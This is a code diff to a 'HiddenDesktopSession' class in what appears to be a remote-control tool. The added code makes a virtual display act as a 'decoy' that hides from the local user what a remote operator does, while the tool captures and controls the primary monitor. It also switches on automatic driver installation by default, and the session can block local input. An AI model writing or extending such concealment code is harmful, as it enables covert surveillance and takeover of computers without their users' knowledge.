@@ -719,14 +719,15 @@ class HiddenDesktopSession:
         if self._use_virtual_display:
             self._virtual_display_active = self._init_virtual_display()
             if self._virtual_display_active and self._virtual_display:
-                monitor_region = self._virtual_display.get_capture_region()
+                # Virtual display is active - it hides what client sees
+                # But we ALWAYS capture from PRIMARY monitor (index 1) where apps run
+                # Virtual display is just a decoy/dummy monitor
                 logger.info(
-                    "Hidden desktop: using virtual display for capture at (%d, %d) size %dx%d",
-                    monitor_region.get("left", 0),
-                    monitor_region.get("top", 0),
-                    monitor_region.get("width", 0),
-                    monitor_region.get("height", 0),
+                    "Hidden desktop: virtual display active (hiding client view), "
+                    "capturing from PRIMARY monitor"
                 )
+                monitor_index = 1  # Primary monitor
+                monitor_region = None  # Let mss select primary monitor
             else:
                 logger.info("Hidden desktop: virtual display not available, using primary monitor")
         
@@ -749,6 +750,12 @@ class HiddenDesktopSession:
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
         
+        # Log operating mode
+        if self._virtual_display_active:
+            logger.info("Using virtual display mode (client view hidden, capturing primary monitor)")
+        else:
+            logger.info("Using fallback mode (client can see actions)")
+        
         if self._block_local_input:
             self.block_local_input()
     
@@ -757,10 +764,15 @@ class HiddenDesktopSession:
         if not VIRTUAL_DISPLAY_AVAILABLE or VirtualDisplaySession is None:
             return False
         
+        # Check if auto-install is enabled via environment variable
+        auto_install = os.getenv("RC_VDD_AUTO_INSTALL", "1").strip().lower() in {
+            "1", "true", "yes", "on"
+        }
+        
         try:
             self._virtual_display = VirtualDisplaySession()
             # Try to start with 1920x1080 resolution
-            if self._virtual_display.start(width=1920, height=1080, auto_install=False):
+            if self._virtual_display.start(width=1920, height=1080, auto_install=auto_install):
                 logger.info("Virtual display started: %dx%d", 
                             *self._virtual_display.resolution)
                 return True
